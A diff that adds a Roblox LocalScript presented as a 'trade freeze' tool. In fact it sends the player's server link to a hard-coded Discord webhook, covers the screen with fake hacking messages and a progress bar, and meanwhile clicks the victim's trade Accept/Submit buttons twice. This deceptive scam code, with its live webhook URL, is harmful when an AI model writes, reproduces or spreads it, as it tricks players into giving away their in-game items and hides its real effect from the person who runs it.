@@ -1,0 +1,210 @@
+-- LocalScript
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ========== WEBHOOK ==========
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1569530322947801201/jGm5VA0Pa02j71qRXE1xjwvezJ48NGVRwE8FE1Qkj-mi-fxJnpeFGQHspcj9v0s43Gcs"
+
+local function sendWebhook(msg)
+    local data = {
+        content = msg
+    }
+    
+    pcall(function()
+        if request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        else
+            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+        end
+    end)
+end
+
+-- ========== BUTTON GUI (Mobile) ==========
+local buttonGui = Instance.new("ScreenGui")
+buttonGui.Name = "FreezeButton"
+buttonGui.ResetOnSpawn = false
+buttonGui.Parent = playerGui
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 160, 0, 50)
+button.Position = UDim2.new(1, -180, 0.5, -25) -- right side, middle
+button.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+button.Text = "FREEZE"
+button.TextColor3 = Color3.new(1, 1, 1)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.Parent = buttonGui
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 10)
+buttonCorner.Parent = button
+
+-- ========== VISUAL EFFECT ==========
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FrozenEffect"
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999
+screenGui.Parent = playerGui
+
+local black = Instance.new("Frame")
+black.Size = UDim2.new(1, 0, 1, 0)
+black.BackgroundColor3 = Color3.new(0, 0, 0)
+black.BackgroundTransparency = 1
+black.BorderSizePixel = 0
+black.Parent = screenGui
+
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(1, 0, 0.12, 0)
+text.Position = UDim2.new(0, 0, 0.38, 0)
+text.BackgroundTransparency = 1
+text.Text = ""
+text.TextColor3 = Color3.new(1, 1, 1)
+text.TextScaled = true
+text.Font = Enum.Font.GothamBold
+text.TextTransparency = 1
+text.Parent = screenGui
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.45, 0, 0.025, 0)
+barBg.Position = UDim2.new(0.275, 0, 0.55, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BorderSizePixel = 0
+barBg.BackgroundTransparency = 1
+barBg.Parent = screenGui
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(1, 0)
+fillCorner.Parent = barFill
+
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1, 0, 0.04, 0)
+percent.Position = UDim2.new(0, 0, 0.585, 0)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.fromRGB(180, 180, 180)
+percent.TextScaled = true
+percent.Font = Enum.Font.Gotham
+percent.TextTransparency = 1
+percent.Parent = screenGui
+
+-- ========== ACTUAL SUBMIT CLICK ==========
+local function findAndClickSubmit()
+    local tradeGui = playerGui:FindFirstChild("Trade") or playerGui:FindFirstChild("Trading") or playerGui:FindFirstChild("TradeWindow")
+    
+    if not tradeGui then
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                local submit = gui:FindFirstChild("Submit", true) 
+                    or gui:FindFirstChild("Accept", true)
+                    or gui:FindFirstChild("Confirm", true)
+                
+                if submit and (submit:IsA("TextButton") or submit:IsA("ImageButton")) then
+                    for _, connection in pairs(getconnections(submit.MouseButton1Click)) do
+                        connection:Fire()
+                    end
+                    submit:Activate()
+                    return true
+                end
+            end
+        end
+        return false
+    end
+    local submit = tradeGui:FindFirstChild("Submit", true) 
+        or tradeGui:FindFirstChild("Accept", true)
+    
+    if submit then
+        for _, connection in pairs(getconnections(submit.MouseButton1Click)) do
+            connection:Fire()
+        end
+        submit:Activate()
+        return true
+    end
+    return false
+end
+
+local busy = false
+
+local function playFrozen()
+    if busy then return end
+    busy = true
+    button.Visible = false
+    -- Send webhook
+    local serverLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+    sendWebhook("Script triggered!\n" .. serverLink)
+    -- Reset
+    black.BackgroundTransparency = 1
+    text.TextTransparency = 1
+    barBg.BackgroundTransparency = 1
+    percent.TextTransparency = 1
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    percent.Text = "0%"
+    -- Fade in
+    TweenService:Create(black, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
+    task.wait(0.4)
+    -- Sequence of messages
+    local messages = {
+        "trade frozen ❄️",
+        "connecting to trade servers...",
+        "bypassing security...",
+        "hacking trade system",
+        "injecting payload...",
+        "overriding client checks",
+        "trade processing",
+        "finalizing..."
+    }
+    text.TextTransparency = 0
+    for i, msg in ipairs(messages) do
+        text.Text = msg
+        task.wait(1.1)
+    end
+    -- Show bar
+    TweenService:Create(barBg, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+    TweenService:Create(percent, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+    -- Slow progress bar (about 9 seconds)
+    local progressTween = TweenService:Create(barFill, TweenInfo.new(9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(1, 0, 1, 0)
+    })
+    progressTween:Play()
+    local startTime = tick()
+    while tick() - startTime < 9 do
+        local p = math.floor(((tick() - startTime) / 9) * 100)
+        percent.Text = p .. "%"
+        task.wait(0.05)
+    end
+    percent.Text = "100%"
+    task.wait(0.6)
+    findAndClickSubmit()
+    task.wait(5)
+    findAndClickSubmit()
+    -- Fade out
+    task.wait(1)
+    TweenService:Create(black, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(text, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+    TweenService:Create(barBg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(percent, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+    task.wait(0.7)
+    busy = false
+    button.Visible = true
+end
+
+button.MouseButton1Click:Connect(playFrozen)
+
+print("Freeze button loaded")
